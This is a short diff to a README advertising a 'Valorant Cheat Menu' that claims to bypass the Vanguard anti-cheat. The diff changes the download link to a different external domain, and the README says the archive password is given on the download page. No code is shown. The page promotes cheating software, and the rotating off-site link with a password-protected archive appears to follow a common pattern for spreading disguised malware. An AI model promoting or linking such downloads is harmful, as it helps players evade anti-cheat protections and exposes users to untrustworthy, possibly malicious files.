@@ -18,7 +18,7 @@ Valorant Cheat Menu - undetected cheat for Valorant. Bypasses Vanguard anti-chea
 
 ## Download
 
-[![Download v2.9.0](https://img.shields.io/badge/Download_v2.9.0-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/valcheatmenu)
+[![Download v2.9.0](https://img.shields.io/badge/Download_v2.9.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/valcheatmenu)
 
 > The archive password is shown on the download page.
 
